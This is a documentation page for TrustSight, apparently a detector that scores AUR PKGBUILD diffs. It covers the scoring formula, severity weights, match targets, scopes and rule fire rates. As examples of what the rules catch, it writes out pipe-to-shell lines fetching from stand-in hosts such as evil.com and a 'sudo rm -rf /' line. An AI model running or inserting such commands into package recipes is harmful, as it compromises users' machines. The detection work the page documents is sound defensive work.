# Rule System Reference

How the rule engine works: the fields a rule
carries, how severity becomes weight, what the series prefixes mean, and
which identifiers are reserved. Individual rule definitions live on the
[category pages](index.md); every rule id below links to its own.

TrustSight uses rules to detect structural signals in PKGBUILD diffs. Each rule contributes to the final score based on its severity weight, match target, and scope.

## How scoring uses rules

The final score is computed from four signal sources. Rules are the primary source (Tier A):

**Score formula:**

```text
base = sum(severity_weight for each fired rule)
base += source_bucket_modifiers (Tier B)
base += novelty_weights scaled by maturity (Tier C)
final = clamp(base, 0, 100)
```

If a FATAL rule fires, the score is immediately set to 100 regardless of all other signals.

### How severity weight maps to risk

Each severity level carries a weight that reflects its information value: how often does this signal fire on benign packages versus malicious ones?

| Severity | Weight | Fire rate on benign corpus | Meaning |
|----------|--------|---------------------------|---------|
| FATAL | 0 (hard-stop) | Never | Score immediately set to 100. Package is attempting to deceive the reviewer. |
| CRITICAL | 40 | Rare | Almost certainly malicious if triggered. curl pipe bash, sudo in functions. |
| HIGH | 25 | Low | Strong signal. Checksum manipulation, unexpected downloads. |
| MEDIUM | 15 | Moderate | Notable but not definitive. Install file changes. |
| LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
| INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |

A CRITICAL rule on its own (weight 40) pushes a package into the FLAGGED range (21+). A single HIGH rule (weight 25) does the same. Two MEDIUM rules (15 + 15 = 30) also reach FLAGGED. The 20-point UNFLAGGED threshold means any single CRITICAL or HIGH rule, or any combination of lower-severity rules summing above 20, will flag the package.

### How match_target selects what the rule sees

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

Both targets see *logical* lines, not physical ones. A shell continuation is joined before matching, so a command split across a trailing backslash is still matched as a whole:

```bash
curl \
  https://evil.example/x.sh | bash
```

Rules match one line at a time, so without this the pipe-to-shell patterns would see only `curl \`. Only lines carrying the same diff marker are joined, so an addition is never spliced onto a removal.

### How scope reduces false positives

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R009 (`sudo`) would fire on every line containing the word `sudo`, including comments (`# sudo is required`), messages (`echo "sudo needed"`), and top-level declarations (`groups=('sudo')`). The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.

The `message` context applies only when a line is *nothing but* a message. A shell line does not end at its first command, so `echo "x"; sudo rm -rf /` is an execution context, not a message, and `echo "$(curl evil | bash)"` runs a command substitution inside the quotes. Any command separator (`;`, `&`, `|`) or substitution (`$(`, backtick) after the message keyword disqualifies the line, which is what stops a short prefix from switching a scoped rule off.

A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.

Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.

A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.

### How rules map to evidence tiers

| Tier | Rule sources | What they measure |
|------|-------------|-------------------|
| A (Structural) | R-series (through R143), S001-S008, X001-X007, C001-C007, D001-D004 | Direct pattern matching against PKGBUILD commands and structure |
| B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
| C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
| D (Verification) | Checksum, PGP, GPG presence | Declared integrity metadata, reported at weight 0 |

Rules only contribute to Tier A. Tiers B and C are computed independently and added to the score alongside the rule contributions.

Tier D contributes nothing to the score. Declared verification is emitted as
weight-0 `P001`-`P007` findings and reported to the reader: TrustSight never
fetches, so it cannot confirm that a declared key signs anything, and a signal
an attacker can assert for free must not be able to lower a score. See
[B10](../../security.md#b10-positive-evidence-is-reported-never-credited).

### Declared-practice findings (P001-P007) {#declared-practice}

The P namespace reports practices the recipe *declares*, not risks that were
found. The `P` prefix exists so a reader seeing `P0xx` in the output knows at
once that it is not a risk finding. Every one is INFO, weight 0, and checkable
by the reader against the file itself. Defined in `src/trustsight/scoring.py`;
rendered from `DECLARED_REASONS`.

| Id | Meaning |
|----|---------|
| `P001` | Checksums declared for all non-VCS sources (`sha256sums`) |
| `P002` | `validpgpkeys` declared |
| `P003` | A signature source accompanies a source, with PGP keys declared |
| `P005` | Source pinned to a full commit hash (`checksum_pinned`) |
| `P006` | Source pinned to a tag - the weaker pin, which `R079` exists to flag because a tag can be repointed |
| `P007` | Source hosted on a trusted forge over HTTPS (`trusted_forge` bucket) |

`P004` is skipped. Only `P002`, `P003` and `P005` render unprompted by default:
five of the seven on every package would bury the risk findings, and the
default set is the ones a reader would find *surprising by their absence*. The
rest render under `--verbose`. The P namespace contrasts with R079/R096/R110:
those fire when a practice is *changed*, these report when one is *present*.
No P finding can lower a score - B10.

---

## R-series (TOML-configurable detection rules) {#r-series}

Defined in `~/.config/trustsight/rules.toml`. Loaded at runtime via `load_rules()` in `src/trustsight/rules.py`.

Each rule supports these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | Rule identifier (`R001`-`R013` core, `R014`/`R016`-`R025` additional TOML, `R039`-`R059` expanded TOML, `R060`+ code-emitted). |
| `name` | `string` | Human-readable name. |
| `pattern` | `string` | Python regex applied to the match target. |
| `severity` | `string` | `FATAL`, `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. |
| `category` | `string` | Semantic category (`network_execution`, `obfuscation`, `installer`, `privilege`, `network_usage`, `injection`, `unicode`, `integrity`). |
| `match_target` | `string` | `"resolved"` : apply to variable-resolved command strings after tokenization. `"raw_line"` : apply to raw diff lines after stripping the `+`/`-` prefix. |
| `scope` | `list[string]` | (Optional, `raw_line` only) Restrict matching to line contexts (`["function_body"]`, `["message"]`, `["other"]`) or to a named PKGBUILD function (`["pkgver"]`, `["package"]`, `["package_foo"]`). When absent, matches all lines. |
| `added_only` | `bool` | (Optional, `raw_line` only) Match only added (`+`) lines. Raw diff lines include removals, so without this a maintainer *deleting* a suspicious line raises the score. All `R039`+ rules set it. |
| `experimental` | `bool` | (Optional) Skip the rule unless `[rules] experimental = true` in `config.toml`. Used for rules whose false-positive rate has not been measured against the benign corpus. |
| `include_comments` | `bool` | (Optional) Also match comment lines, which are filtered out for every other rule. Only for rules whose target is the *reader* rather than the shell (R012, R013): a commented-out command does not run, but a comment is exactly where an injection or a hidden character lives. |

### R001 {#r001}

See [R001: Remote Script Execution](fetch-and-execution.md#r001).


### R002 {#r002}

See [R002: Wget Pipe to Shell](fetch-and-execution.md#r002).


### R003 {#r003}

See [R003: Base64 Decode and Execute](obfuscation.md#r003).


### R004 {#r004}

See [R004: Checksum Disabled](integrity.md#r004).


### R005 {#r005}

See [R005: Checksum Emptied](integrity.md#r005).


### R006 {#r006}

See [R006: Insecure Download Protocol](fetch-and-execution.md#r006).


### R007 {#r007}

See [R007: Install File Modification](install-and-persist.md#r007).


### R008 {#r008}

See [R008: Unexpected File Download](fetch-and-execution.md#r008).


### R009 {#r009}

See [R009: Privilege Escalation](fetch-and-execution.md#r009).


### R010 {#r010}

See [R010: Uses curl in PKGBUILD](fetch-and-execution.md#r010).


### R011 {#r011}

See [R011: Uses wget in PKGBUILD](fetch-and-execution.md#r011).


### R012 {#r012}

See [R012: Prompt Injection Detection](deception.md#r012).


### R013 {#r013}

See [R013: Unicode Bidi Override](deception.md#r013).


### R014 {#r014}

See [R014: validpgpkeys Added](integrity.md#r014).


### R016 {#r016}

See [R016: New Make/Opt/Check Dependency](naming-and-dependency.md#r016).


### R017 {#r017}

See [R017: Setuid/Setgid Permission](install-and-persist.md#r017).


### R018 {#r018}

See [R018: Symlink Redirect](staging-and-recon.md#r018).


### R019 {#r019}

See [R019: Suspicious Environment Variable](integrity.md#r019).


### R020 {#r020}

See [R020: Network connection attempt](fetch-and-execution.md#r020).


### R021 {#r021}

See [R021: Suspicious file write](staging-and-recon.md#r021).


### R022 {#r022}

See [R022: Sensitive binary execution](fetch-and-execution.md#r022).


### R023 {#r023}

See [R023: Strace detection attempt (TracerPid check)](deception.md#r023).


### R024 {#r024}

See [R024: Strace log truncated (possible flood evasion)](deception.md#r024).


### R025 {#r025}

See [R025: Eval or Exec Usage](obfuscation.md#r025).


### Severity weights

Configured in `config.toml` `[severity_weights]`:

| Severity | Weight |
|----------|--------|
| FATAL | 0 (hard-stop score at 100) |
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

### FATAL rules {#fatal-rules}

R012 and R013 are shipped FATAL rules. R106 can also emit a FATAL finding when a current package fact matches an IOC whose confidence is `confirmed`; lower-confidence IOC matches use lower severities. FATAL findings contribute **0 weight** to the running total but immediately set `final_score = 100` and risk level `"Critical"`. No other rules are evaluated for weight contribution after a FATAL fires; the short-circuit is in `calculate_score()` at `src/trustsight/scoring.py`. R012 and R013 are the shipped rules protected from configuration removal or downgrade; R106's severity is derived from the signed/local indicator confidence tier.

---

## C-series (code, structural rules) {#c-series}

Generated by `_structural_findings()` in `src/trustsight/analysis/structural.py`. Not configurable via TOML. Fire based on structural comparisons between the diff and the post-diff state. Each one compares the *before* and *after* of the diff; a checksum that changed while the source stayed put, a URL swapped without a version bump; which a pattern matched against one line at a time cannot express. Comparisons use `_pkgver_changed_in_diff()` to detect `pkgver=` value changes.

`_structural_findings()` is shared by `analyze_package()` (live) and `scan_diff()` (offline replay), so the two pipelines cannot drift apart.

### C001 {#c001}

See [C001: Checksum Changed Without Source Change With Stable Version](integrity.md#c001).


### C002 {#c002}

See [C002: Checksum Updated With Version Bump](integrity.md#c002).


### C003 {#c003}

See [C003: Source URL Changed Without Version Bump](integrity.md#c003).



### C004 {#c004}

See [C004: Checksum Removed For Unchanged Source](integrity.md#c004).


### C005 {#c005}

See [C005: Binary Artifact From Untrusted Source](integrity.md#c005).


### C006 {#c006}

See [C006: Maintainer Change With New Source Domain](maintainer-and-metadata.md#c006).


### C007 {#c007}

See [C007: Command Substitution In Source Array](fetch-and-execution.md#c007).


---

## Expanded ruleset (R039+) {#expanded-ruleset}

These rules roughly double the pattern-based detection surface. They are **enabled by default**, having been calibrated against a 3246-diff stratified benign corpus: fourteen fire on zero benign diffs, and every remaining hit was inspected individually; all but one were true positives. Enabling them costs 0.5 percentage points of zero-rate and leaves p95 unchanged.

The `experimental` flag remains supported for future additions. A rule carrying `experimental = true` is skipped unless `config.toml` sets:

```toml
[rules]
experimental = true
```

Numbering jumps over `R015`, `R026`-`R038` to keep the core and expanded ranges readable. `R014` and `R016`-`R025` shipped as TOML rules and are documented above; `R015` and `R026`-`R038` are **reserved**: they are referenced by nothing in the shipped config and must not be assigned casually, because a maintainer rule that reuses an id already present in a user's `rules.toml` would silently change what the user's override means.

Every `raw_line` rule below sets `added_only = true`.

### R039 {#r039}

See [R039: Eval With Dynamic Content](obfuscation.md#r039).


### R040 {#r040}

See [R040: Shell -c With Dynamic Payload](obfuscation.md#r040).


### R041 {#r041}

See [R041: Shell Network Redirection](fetch-and-execution.md#r041).


### R042 {#r042}

See [R042: Download Then Execute](fetch-and-execution.md#r042).


### R043 {#r043}

See [R043: Base64 Blob Decode](obfuscation.md#r043).


### R044 {#r044}

See [R044: Interpreter One-Liner With Network](fetch-and-execution.md#r044).


### R045 {#r045}

See [R045: Binary Encoding Pipe](obfuscation.md#r045).


### R046 {#r046}

See [R046: Source URL Uses IP Address](fetch-and-execution.md#r046).


### R047 {#r047}

See [R047: Source URL Uses Non-Standard Port](fetch-and-execution.md#r047).


### R048 {#r048}

See [R048: Source URL On Free Registrar TLD](fetch-and-execution.md#r048).


### R049 {#r049}

See [R049: Compiler Plugin Or Loader Override](integrity.md#r049).


### R050 {#r050}

See [R050: Compiler Hardening Disabled](integrity.md#r050).


### R051 {#r051}

See [R051: Network Access In pkgver](fetch-and-execution.md#r051).


### R052 {#r052}

See [R052: Dotfile Written To User Profile](install-and-persist.md#r052).


### R053 {#r053}

See [R053: Setuid Or Setgid Bit Set In Package Root](install-and-persist.md#r053).


### R059 {#r059}

See [R059: Setuid Or Setgid Bit Set Outside Package Root](install-and-persist.md#r059).


### R054 {#r054}

See [R054: Persistence Unit Outside Package Root](install-and-persist.md#r054).


### R055 {#r055}

See [R055: Git Clone With Variable Branch](fetch-and-execution.md#r055).


### R056 {#r056}

See [R056: Download Then Source](fetch-and-execution.md#r056).


### R057 {#r057}

See [R057: TLS Verification Disabled](fetch-and-execution.md#r057).


### R058 {#r058}

See [R058: Write Outside Package Root](staging-and-recon.md#r058).


---

### R060 {#r060}

See [R060: Critical Build Function Modified](fetch-and-execution.md#r060).


### R061 {#r061}

See [R061: Hidden Network Fetch In Build](fetch-and-execution.md#r061).


---

## Measured fire rates {#experimental-fire-rates}

The detailed rows below are historical measurements against the 3,246-diff benign corpus with a 209,909-name dependency corpus. The current aggregate calibration baseline is 3,739 diffs; the rows are retained with their source corpus because the per-rule hit counts have not been regenerated as a complete table. All D-series, R061-R064, and R081-R082 rules are **on by default**, as are the code-emitted rules R083-R131. These are **false-positive rates**: every hit is a benign package.

The numbers are enforced, not just recorded. `scripts/calibration_gates.py` replays the corpus against the *shipped* configuration in a temporary directory with a cold database, and fails the build if any scoring rule exceeds a 0.30 fire rate, if benign p95 reaches the malicious p5, if a weight-0 annotation starts scoring, or if a labelled attack fixture stops being detected. It runs on every push. Class C and Class D rules are absent from this table because they cannot fire on a stateless diff at all, which is itself one of the gates.

For a complete reference including the core and expanded rules, see [Fire Rates](../../explanation/fire-rates.md).

| Rule | Severity | Fires | Rate | Read |
|------|----------|-------|------|------|
| D004 | HIGH | 0 | 0.00 % | No false positive across the 2084 corpus diffs that declare `provides`/`replaces`. |
| R062 | HIGH | 3 | 0.09 % | All `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. Real privileged behaviour, which is the point. |
| R063 | HIGH | 0 | 0.00 % | Zero, because it asks where the patch comes from rather than whether it is declared. The broad "not in `source=()`" form measured 2.13 %. |
| R064 | MEDIUM | 1 | 0.03 % | `transset-df`, a genuine https to http downgrade. |
| R065 | INFO | - | - | Not calibrated: fires on any recent update, which is inherently time-of-run dependent. |
| R066 | INFO | - | - | Not calibrated: fires on packages < 30 days old, which is a small and shifting set. |
| R067 | MEDIUM | - | - | Not calibrated: fires when the user's last analysis is > 1 year old, which varies per database. |
| R068 | INFO | - | - | Not calibrated: zero-weight metadata; context only. |
| R069 | HIGH | 1 | 0.03 % | Near-zero; matches the predicted rate. |
| R070 | HIGH/MED | 8 | 0.25 % | All HIGH (LD_ vars). No MEDIUM fires in corpus. |
| R071 | HIGH | - | TBD | Not corpus-measurable; requires live git history. |
| R072 | INFO | 515 | 15.87 % | INFO weight 0; not a scoring impact. |
| R074 | HIGH | 2/179 pkgs | 1.12 % | Measured via package-name scan with seeded DB. Fires on `dosbox-x` and `electron36`. |
| R075 | MEDIUM | 11 | 0.34 % | Measured with seeded DB (209,909-name seed). Well under the 30% gate. |
| D001 | HIGH | 5 | 0.15 % | Comfortably low for HIGH. All five are real package names that simply nothing else in the AUR depends on (`kde-rounded-corners-x11`, `python2-gevent-eventemitter`, `udfclient-fuse3`), not parser noise. |
| D002 | HIGH | 0 | 0.00 % | No false positive anywhere in the corpus. Bounded by D001, which it refines. |
| D003 | MEDIUM | 15 | 0.46 % | Almost all are `git` added to fetch submodules, the legitimate case the MEDIUM severity anticipates. |
| R060 | INFO | 694 | **21.4 %** | Why it is INFO. No narrowing reaches triage quality (`pkgver` unchanged still leaves 11.6 %, a bump that also edits `build()` is 9.8 %), so it carries weight 0 and reports context instead of scoring. Harmless at that weight, hence on by default. |
| R061 | HIGH | 7 | 0.22 % | The hits are real build-time downloads (`apple-fonts`, `ttf-ms-win-*`, `gamescope-nvidia`), which is the behaviour the rule exists to surface rather than noise. |
| R076 | MEDIUM | 0 | 0.00 % | Needs both an unsafe literal version and its interpolation into a source URL. |
| R077 | HIGH | 1 | 0.03 % | A legitimate `$HOME/.config/...log` write from a `post_upgrade`. |
| R079 | HIGH/MED | 4 | 0.12 % | Maintainers tracking a moving patch branch under a fixed version, which is the shape the rule describes. |
| R080 | MEDIUM | 6 | 0.18 % | Schemes outside the shipped allowlist. |
| R084 | HIGH | 0 | 0.00 % | `mktemp -d` is excluded wholesale, so private scratch directories never count. |
| R087 | HIGH | 0 | 0.00 % | The one paste-host reference in the corpus is a gist download, which is R061's. |
| R085 | HIGH | 0 | 0.00 % | Reads the unit's `ExecStart`, not its filename. |
| R086 | INFO | 0 | 0.00 % | `env` was dropped after a `sed` expression read as a command position. |
| R088 | HIGH | 0 | 0.00 % | Deliberately the quietest of the persistence group. |
| R089 | INFO | 0 | 0.00 % | A benign diff with one or two hits cannot reach three distinct stages. |
| R106 | tiered | 0 | 0.00 % | With the shipped (empty) list and with a synthetic one. A positive control (`github.com`) fires on 1561 diffs, so the surface extraction is real. |
| R114 | MEDIUM | 4 | 0.12 % | Packages that legitimately ship pacman hooks. |
| R115 | MEDIUM | 0 | 0.00 % | An unchanged epoch never surfaces in a hunk. |
| R116 | HIGH/MED | 0 | 0.00 % | Related name shapes suppress; cold start cannot fire. |
| R117 | INFO | 0 | 0.00 % | Weight 0. Anchoring the check on an ANSI-C quote opener removed four regex end-anchor false positives. |
| R119 | HIGH | 0 | 0.00 % | Architecture checks are not probes. |
| R120 | HIGH | 0 | 0.00 % | A type check on decoded bytes, so encodings do not need enumerating. |
| R121 | HIGH | 0 | 0.00 % | Heredoc bodies are excluded from command scanning. |
| R123 | HIGH | 0 | 0.00 % | Command-position anchored; a client in `makedepends` is a declaration. |
| R124 | HIGH | 0 | 0.00 % | Still zero after the execution match was widened to a path with arguments. |
| R128 | HIGH | 0 | 0.00 % | A representative backdoor fixture goes from 25 to 50 with it. |
| R129 | HIGH | 3 | 0.09 % | One package resolving a redirect with `curl` at the top level, which really does fetch on a metadata refresh. |
| R130 | HIGH/MED/INFO | 6 | 0.18 % | Two introductions and four upstream key rotations. |
| R131 | HIGH/MED | 3 | 0.09 % | One wine package that genuinely disables FORTIFY_SOURCE. |

Getting D001 from 5.95 % to 0.15 % took two extractor fixes, both found by this measurement rather than by review:

- An unbounded fallback for unquoted array entries read shell fragments (`if`, `[[`, `!`) out of a `package()` body as dependency names.
- Comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`).

Both are covered by regression tests in `tests/test_deps_rules.py`.

### R062 {#r062}

See [R062: Install Hook Fetches Or Executes](install-and-persist.md#r062).


### R063 {#r063}

See [R063: Patch Applied From Outside The Build Tree](integrity.md#r063).


### R064 {#r064}

See [R064: Source URL Downgraded To HTTP](integrity.md#r064).


---

## Temporal context rules (R065-R067) {#temporal-rules}

Defined in `src/trustsight/analysis/temporal.py`. They inspect git commit timestamps on
the AUR repository to surface temporal signals. None require a diff, so they
also fire on first-seen packages in `_make_fresh_analysis()` (in `pipeline.py`).

All three are **on by default** with no config toggle.

### R065 {#r065}

See [R065: Very Recent Update](temporal.md#r065).


### R066 {#r066}

See [R066: Brand New Package](temporal.md#r066).


### R067 {#r067}

See [R067: Stale Package Revived](temporal.md#r067).


---

## Install and build context rules (R068-R070) {#install-build-rules}

Defined in `src/trustsight/analysis/build.py` and `src/trustsight/analysis/pipeline.py`. They
inspect the diff for changes to security-critical build and install
infrastructure - hooks that run as root, signature verification that gets
dropped, environment variables that subvert the compiler.

### R068 {#r068}

See [R068: Install Hook Present](install-and-persist.md#r068).


### R069 {#r069}

See [R069: GPG Verification Removed](integrity.md#r069).


### R070 {#r070}

See [R070: Build Environment Subversion](integrity.md#r070).


---

## Maintainer and capability rules (R071-R072) {#maintainer-capability-rules}

### R071 {#r071}

See [R071: Untrusted Maintainer Takeover](maintainer-and-metadata.md#r071).


### R072 {#r072}

See [R072: Capability Density Anomaly](composition.md#r072).


---

## Temporal metadata (R073) - not a scored finding {#r073}

### R073 {#r073}

See [R073: Accelerated Release Cadence](corpus-behavioral.md#r073).


---

## Naming rule (R074) - package-name typosquat {#r074}

### R074 {#r074-rule}

See [R074: Package-Name Typosquat](naming-and-dependency.md#r074-rule).


---

## Dependency-set expansion rule (R075) {#r075}

### R075 {#r075-rule}

See [R075: Dependency-Set Expansion](count-based.md#r075-rule).


---

## Install and build context rules (R081-R082) {#r081-r082}

Defined in `src/trustsight/analysis/build.py`. They inspect install hooks and
build-function content for additional risk signals. Both graduated from experimental
to enabled by default in v0.11.0 with zero false positives on the 3243-diff benign corpus.

### R081 {#r081}

See [R081: Foreign Package Manager In Install Hook](install-and-persist.md#r081).


### R082 {#r082}

See [R082: Shell Obfuscation Density](count-based.md#r082).


---

## D-series dependency rules {#d-series}

Defined in `src/trustsight/analysis/dependencies.py`, not in `rules.toml`. They compare the
dependency arrays before and after the diff and consult the local database, so
they cannot be expressed as a pattern over a single line.

They also have to bypass the engine's own filtering: `rules.py` strips
`depends`, `makedepends`, `optdepends`, and `checkdepends` lines before any
pattern runs, which is why extraction lives in `src/trustsight/deps.py`.

All D-series rules are **enabled by default** since v0.7.0. Disable them
individually under [`[experimental_rules]`](../configuration.md#experimental_rules).

### D001 {#d001}

See [D001: Novel Dependency Added](naming-and-dependency.md#d001).


### D002 {#d002}

See [D002: Typosquatted Dependency](naming-and-dependency.md#d002).


### D004 {#d004}

See [D004: Dependency Hijack Via Provides](naming-and-dependency.md#d004).


### D003 {#d003}

See [D003: New Network-Using Makedepends](naming-and-dependency.md#d003).



---

## Network-surface rules (R076, R079, R080, R087, R123, R129) {#network-surface-rules}

These six ask one question in different places: what does this recipe reach
over the network, in which direction, and when.

### R076 {#r076}

See [R076: Version-In-URL Injection](fetch-and-execution.md#r076).


### R079 {#r079}

See [R079: Moved Git Ref](integrity.md#r079).


### R080 {#r080}

See [R080: Exotic Source Protocol](fetch-and-execution.md#r080).


### R087 {#r087}

See [R087: Upload To Paste Or File-Drop Host](fetch-and-execution.md#r087).


### R123 {#r123}

See [R123: Covert Egress](fetch-and-execution.md#r123).


### R129 {#r129}

See [R129: Parse-time Network Fetch](fetch-and-execution.md#r129).


---

## Install-path persistence (R077, R084, R085, R088, R114, R128) {#persistence-rules}

One shared write-target resolver backs this group (`analysis/persistence.py`):
`install`/`cp`/`mv`/`ln` destinations including `-t DIR`, `>` redirects, and
the verb-substitution forms `tee`, `dd of=`, `mkdir -p`, `touch`, `rsync` and
`sed -i`. Every match is command-position anchored, so a quoted string such as
`'cp x ~/.zshrc'` never reads as a write.

### R077 {#r077}

See [R077: Write To User Home Or RC](install-and-persist.md#r077).


### R084 {#r084}

See [R084: World-Writable Staging](staging-and-recon.md#r084).


### R085 {#r085}

See [R085: Systemd ExecStart From Runtime-Writable Path](install-and-persist.md#r085).


### R088 {#r088}

See [R088: Hidden Drop](staging-and-recon.md#r088).


### R114 {#r114}

See [R114: Pacman Hook Installed](install-and-persist.md#r114).


### R128 {#r128}

See [R128: Build Writes Outside Staging Root](staging-and-recon.md#r128).


---

## Reconstruction and delivery (R117 to R124, R127, R132, R136 to R140) {#delivery-rules}

### R117 {#r117}

See [R117: Obfuscated Literal Reconstructed](obfuscation.md#r117).


### R132 {#r132}

See [R132: Indirect Command Expansion](obfuscation.md#r132).


---

### R118 {#r118}

See [R118: Embedded Binary In Tree](integrity.md#r118).


### R119 {#r119}

See [R119: Anti-Analysis Check](deception.md#r119).


### R120 {#r120}

See [R120: Reconstructed Executable Payload](fetch-and-execution.md#r120).


### R121 {#r121}

See [R121: Build-time Generation Then Execution](fetch-and-execution.md#r121).


### R122 {#r122}

See [R122: Archive Trailer Anomaly](integrity.md#r122).


### R124 {#r124}

See [R124: Write Then Execute](fetch-and-execution.md#r124).


### R127 {#r127}

See [R127: Indirect Remote Execution](fetch-and-execution.md#r127).


### R136 {#r136}

See [R136: Committed File Executed Without Declaration](fetch-and-execution.md#r136).


### R137 {#r137}

See [R137: Fetch Then Execute](fetch-and-execution.md#r137).


### R138 {#r138}

See [R138: Downloaded Source File Executed](fetch-and-execution.md#r138).


### R139 {#r139}

See [R139: Service ExecStart Targets Undeclared Binary](install-and-persist.md#r139).


### R140 {#r140}

See [R140: PATH Injection With Undeclared Directory](staging-and-recon.md#r140).


---

## Composition (R086, R089) {#composition-rules}

Both are annotations. Neither adds weight, so neither can turn an UNFLAGGED package
into a flagged one on its own.

### R086 {#r086}

See [R086: Host Reconnaissance](staging-and-recon.md#r086).


### R089 {#r089}

See [R089: Attack-Chain Composition](composition.md#r089).


---

## Integrity and trust (R130, R131) {#integrity-trust-rules}

### R130 {#r130}

See [R130: Signing Key Set Changed](integrity.md#r130).


### R131 {#r131}

See [R131: Build Flags Weakened](integrity.md#r131).


---

## Class B: declaration-scope rules (R115, R116) {#class-b-rules}

### R115 {#r115}

See [R115: Epoch Introduced](maintainer-and-metadata.md#r115).


### R116 {#r116}

See [R116: Provides/Replaces Scope Expansion](naming-and-dependency.md#r116).


---

## Class C: longitudinal rules (R083, R094 to R098, R102) {#class-c-rules}

Class C rules do not read a diff. They read `PropertyBreak` records from the
corpus property layer: a value that held for many consecutive observations and
then changed. Every one of them is silent on a cold database by construction,
because the first observation of a property only inserts it.

The `[longitudinal] stability_floor` (default 10) is the gate: a value must hold
at least that many consecutive observations before a change is reported at all.
Above the floor the weight ramps logistically, reaching roughly 0.9 by about 40
observations.

### R083 {#r083}

See [R083: Long-Stable Property Changed](maintainer-and-metadata.md#r083).


### R094 {#r094}

See [R094: Security-Relevant Build Flag Change](integrity.md#r094).


### R095 {#r095}

See [R095: Dependency Vendored Into Source](naming-and-dependency.md#r095).


### R096 {#r096}

See [R096: Source Host Changed](maintainer-and-metadata.md#r096).


### R097 {#r097}

See [R097: Version Scheme Changed](maintainer-and-metadata.md#r097).


### R098 {#r098}

See [R098: Package Description Changed](maintainer-and-metadata.md#r098).


### R102 {#r102}

See [R102: Build System Changed](maintainer-and-metadata.md#r102).


---

## Class D: corpus rules (R071, R090, R092, R093, R100, R101, R105, R107, R108, R110, R111, R112, R125, R126) {#class-d-rules}

Class D rules describe the corpus, not a package. They run once per metadata
cycle in `trustsight full-aur`, after the per-package loop, and each returns one
finding per **cluster**, with the members in `params.members`. They are silent
without a prior snapshot: the calibration gate is
`fire_rate(no_baseline) == 0`.

### R071 {#r071-corpus}

See [R071: Untrusted Maintainer Takeover (corpus path)](maintainer-and-metadata.md#r071-corpus).


### R090 {#r090}

See [R090: Ownership Transition](maintainer-and-metadata.md#r090).


### R092 {#r092}

See [R092: Mass Adoption](count-based.md#r092).


### R093 {#r093}

See [R093: Orphan/Adoption Dependency](corpus-behavioral.md#r093).


### R100 {#r100}

See [R100: Shared Source Repository](count-based.md#r100).


### R101 {#r101}

See [R101: Name/Host Consensus Divergence](naming-and-dependency.md#r101).


### R105 {#r105}

See [R105: Attribute Burst](count-based.md#r105).


### R107 {#r107}

See [R107: Transitive Exposure](corpus-behavioral.md#r107).


### R108 {#r108}

See [R108: Maintainer Baseline Deviation](maintainer-and-metadata.md#r108).


### R110 {#r110}

See [R110: Name/Repo Divergence](naming-and-dependency.md#r110).


### R111 {#r111}

See [R111: Transitive Orphan Exposure](corpus-behavioral.md#r111).


### R112 {#r112}

See [R112: Dependency Centrality](corpus-behavioral.md#r112).


### R125 {#r125}

See [R125: Introduction Rate Deviation](corpus-behavioral.md#r125).


### R126 {#r126}

See [R126: Adopt-then-Modify](maintainer-and-metadata.md#r126).

## Additional Per-Package Rules {#additional-per-package-rules}

R141-R143 are per-package findings, not Class D corpus findings. S001-S008
and X001-X007 are the sabotage and crossfire families; their category pages
are authoritative for their conditions and severities.

### R141 {#r141}

See [R141: Adopted From Orphan](maintainer-and-metadata.md#r141).

### R142 {#r142}

See [R142: Recipe Changed Without Upstream](integrity.md#r142).

### R143 {#r143}

See [R143: Adopted, Recipe Rewritten, Unpinned Fetch](maintainer-and-metadata.md#r143).

### X001 {#x001}

See [X001: Encoded Payload Decoded To A Shell](crossfire.md#x001).

### X002 {#x002}

See [X002: Non-Literal Executable Name](crossfire.md#x002).

### X003 {#x003}

See [X003: Obfuscated Command Argument](crossfire.md#x003).

### X004 {#x004}

See [X004: Build Output Suppressed](crossfire.md#x004).

### X005 {#x005}

See [X005: Home Reached By An Alternative Spelling](crossfire.md#x005).

### X006 {#x006}

See [X006: Source Points Somewhere Unexpected](crossfire.md#x006).

### X007 {#x007}

See [X007: Multiple Evasion Techniques](crossfire.md#x007).

### S001 {#s001}

See [S001: Recursive Self-Spawn](sabotage.md#s001).

### S002 {#s002}

See [S002: Recursive Deletion Outside The Build Tree](sabotage.md#s002).

### S003 {#s003}

See [S003: Raw Block Device Write](sabotage.md#s003).

### S004 {#s004}

See [S004: Secure Deletion Of User Data](sabotage.md#s004).

### S005 {#s005}

See [S005: Permission Change On A System Path](sabotage.md#s005).

### S006 {#s006}

See [S006: System Service Disruption](sabotage.md#s006).

### S007 {#s007}

